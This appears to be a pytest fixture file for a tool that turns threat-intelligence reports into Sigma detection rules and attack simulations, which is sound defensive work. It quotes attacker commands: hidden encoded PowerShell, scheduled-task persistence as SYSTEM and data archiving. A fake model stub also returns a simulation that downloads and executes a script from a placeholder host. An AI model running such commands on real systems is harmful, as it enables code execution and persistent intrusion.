from __future__ import annotations

from pathlib import Path

import pytest

from ti2dac.config import Settings
from ti2dac.llm import LLM
from ti2dac.models import (
    ADSDraft, Clause, DetectionDraft, EventField, ExpectedEvent, ExtractedBehaviour, FieldCondition, LogSource,
    NegativeTestDraft, Observables, ReportAnalysis, Scores, Selection, SigmaDraft, SimulationDraft,
    TelemetryDraft, TestEvent, TimelineEvent, TranslationDraft,
)


@pytest.fixture(autouse=True)
def _no_local_env_file(monkeypatch, tmp_path):
    """Tests never read the developer's real .env, which may hold live API keys."""
    monkeypatch.setenv("TI2DAC_ENV_FILE", str(tmp_path / "absent.env"))


def ev(desc: str, match: bool, **fields) -> TestEvent:
    return TestEvent(description=desc, should_match=match, fields=[EventField(name=k, value=v) for k, v in fields.items()])

ROOT = Path(__file__).resolve().parents[1]
DFIR_REPORT = ROOT / "report" / "the-dfir-report" / "2024-08-26-blacksuit-ransomware.html"

SAMPLE_REPORT = """# Operation Example: intrusion analysis

## Summary
The actor gained access through a phishing document and later deployed ransomware.

## Execution
The threat actor executed PowerShell with an encoded command: powershell.exe -nop -w hidden -enc SQBFAFgA
from a Word document child process (winword.exe spawning powershell.exe).

## Persistence
They created a scheduled task with schtasks /create /tn "UpdateCheck" /tr "C:\\ProgramData\\upd.exe" /sc onlogon /ru SYSTEM
to maintain access (T1053.005).

## Collection
Data was archived with 7z.exe a -pSecret C:\\ProgramData\\data.7z C:\\Shares\\Finance before exfiltration.

## Indicators
| Type | Value |
|---|---|
| SHA256 | 0f3a1d4e5b6c7d8e9f00112233445566778899aabbccddeeff00112233445566 |
| Domain | evil-c2[.]com |
| IP | 185.220.101[.]4 |
"""


def sim(simulate: str, cleanup: str, lang="powershell") -> SimulationDraft:
    return SimulationDraft(
        platform="windows", privileges="admin", language=lang, preconditions=["Sysmon installed"],
        simulate=simulate, cleanup=cleanup,
        expected_events=[ExpectedEvent(source="Sysmon", event_id="1", matching_fields="Image=*\\schtasks.exe")],
        atomic_tests=["Scheduled Task Startup Script"], safety_notes=["Creates a benign task only"])


def task_draft(field: str = "CommandLine") -> DetectionDraft:
    return DetectionDraft(
        sigma=SigmaDraft(
            title="Scheduled Task Created to Run at Logon as SYSTEM",
            description="Detects schtasks creating an ONLOGON task running as SYSTEM, as used for persistence.",
            logsource=LogSource(product="windows", category="process_creation", service=""),
            selections=[
                Selection(name="selection_img", clauses=[
                    Clause(conditions=[FieldCondition(field="Image", modifiers=["endswith"], values=["\\schtasks.exe"])]),
                    Clause(conditions=[FieldCondition(field="OriginalFileName", modifiers=[], values=["schtasks.exe"])]),
                ]),
                Selection(name="selection_cli", clauses=[Clause(conditions=[
                    FieldCondition(field=field, modifiers=["contains", "windash", "all"], values=["/create", "/sc onlogon", "/ru system"]),
                ])]),
                Selection(name="filter_main_sccm", clauses=[Clause(conditions=[
                    FieldCondition(field="ParentImage", modifiers=["endswith"], values=["\\ccmexec.exe"])])]),
            ],
            condition="all of selection_* and not 1 of filter_*",
            falsepositives=["Software installers registering logon tasks"], level="medium",
        ),
        telemetry=TelemetryDraft(log_source="Sysmon", event_ids=["1"], required_fields=["Image", "CommandLine", "ParentImage"],
                                 config_requirements=["Sysmon process creation enabled"], blind_spots=["Task created via COM API"]),
        simulation=sim(
            'schtasks /create /tn "ti2dac_task" /tr "cmd.exe /c echo ti2dac" /sc onlogon /ru SYSTEM /f',
            'schtasks /delete /tn "ti2dac_task" /f'),
        negative_test=NegativeTestDraft(benign_activities=["schtasks /query", "Create a daily task as a standard user"]),
        ads=ADSDraft(goal="Detect logon persistence via scheduled tasks", strategy_abstract="Process creation of schtasks with /sc onlogon /ru system",
                     technical_context="schtasks.exe registers tasks in the Task Scheduler service.",
                     triage_steps=["Inspect the task action", "Check the parent process"], response_actions=["Disable the task", "Isolate host"]),
        test_events=[
            ev("simulation", True, Image="C:\\Windows\\System32\\schtasks.exe", OriginalFileName="schtasks.exe",
               CommandLine='schtasks /create /tn "ti2dac_task" /tr "cmd.exe /c echo ti2dac" /sc onlogon /ru SYSTEM /f',
               ParentImage="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
            ev("benign query", False, Image="C:\\Windows\\System32\\schtasks.exe", OriginalFileName="schtasks.exe",
               CommandLine="schtasks /query /fo LIST", ParentImage="C:\\Windows\\explorer.exe"),
        ],
    )


def analysis() -> ReportAnalysis:
    obs = Observables(processes=["schtasks.exe"], command_lines=['schtasks /create /tn "UpdateCheck" /sc onlogon /ru SYSTEM'],
                      registry=[], files=[], services_tasks=["UpdateCheck"], network=[])
    b1 = ExtractedBehaviour(
        id="B1", name="Scheduled task for logon persistence", description="Actor created an ONLOGON SYSTEM task.",
        tactic="persistence", technique_id="T1053.005", technique_name="Scheduled Task", platform="windows",
        evidence=["They created a scheduled task with schtasks /create /tn \"UpdateCheck\""], observables=obs,
        log_sources=["Sysmon EID 1", "Security 4698"], detection_idea="schtasks /create with /sc onlogon /ru system",
        scores=Scores(observability=5, reproducibility=5, mapping_confidence=5, fp_risk=2))
    b2 = b1.model_copy(update={"id": "B2", "name": "Encoded PowerShell from Office", "technique_id": "T1059.001",
                               "technique_name": "PowerShell", "tactic": "execution",
                               "evidence": ["The threat actor executed PowerShell with an encoded command"]})
    b3 = b1.model_copy(update={"id": "B3", "name": "Invented behaviour", "technique_id": "T1059.999",
                               "evidence": ["this sentence is not in the report at all, really not"]})
    return ReportAnalysis(title="Operation Example", actors=["EXAMPLE-SPIDER"], malware_tools=["7-Zip"], victimology="Finance",
                          summary="Phishing to ransomware.", behaviours=[b1, b2, b3],
                          timeline=[TimelineEvent(when="Day 1", event="Phishing")])


class FakeLLM(LLM):
    """Deterministic stand-in for the API. First generate draft uses a bad field to force a repair."""

    def __init__(self, settings, bad_first=True):
        super().__init__(settings)
        self.calls: list[tuple[str, str]] = []
        self.bad_first = bad_first

    def structured(self, stage, system, user, schema):
        self.calls.append((stage, user))
        self.usage.calls += 1
        if schema is ReportAnalysis:
            return analysis()
        if schema is DetectionDraft:
            if "PowerShell" in user:
                d = task_draft()
                d.sigma.title = "Encoded PowerShell Spawned by Office"
                d.sigma.selections = [
                    Selection(name="selection_parent", clauses=[Clause(conditions=[
                        FieldCondition(field="ParentImage", modifiers=["endswith"], values=["\\winword.exe", "\\excel.exe"])])]),
                    Selection(name="selection_cli", clauses=[Clause(conditions=[
                        FieldCondition(field="CommandLine", modifiers=["contains", "windash"], values=[" -enc ", " -encodedcommand "])])]),
                ]
                d.sigma.condition = "all of selection_*"
                d.simulation = sim("Invoke-WebRequest https://evil.example.net/a.ps1 | iex", "Remove-Item $env:TEMP\\ti2dac_*")
                return d
            return task_draft("NotARealSigmaField" if self.bad_first else "CommandLine")
        if schema is SigmaDraft:
            return task_draft().sigma
        if schema is TranslationDraft:
            return TranslationDraft(query="metadata.event_type = \"PROCESS_LAUNCH\"", notes="UDM", confidence="medium")
        raise AssertionError(schema)


@pytest.fixture
def settings(tmp_path) -> Settings:
    s = Settings()
    s.state_dir = str(tmp_path / "state")
    s.output_dir = str(tmp_path / "out")
    s.ai.response_cache = False
    return s


@pytest.fixture
def report_file(tmp_path) -> Path:
    p = tmp_path / "operation-example.md"
    p.write_text(SAMPLE_REPORT)
    return p
